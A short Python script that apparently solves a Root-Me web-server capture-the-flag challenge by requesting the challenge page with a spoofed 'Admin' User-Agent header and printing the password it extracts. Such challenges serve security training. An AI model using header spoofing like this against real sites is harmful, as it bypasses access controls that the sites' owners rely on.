import requests

response = requests.get('http://challenge01.root-me.org/web-serveur/ch2/', headers={'User-Agent': 'Admin'})

content = response.text

start = content.find("Password: ")+len("Password: ")
end = content.find("\n", start)
flag = content[start:end]

print(flag)
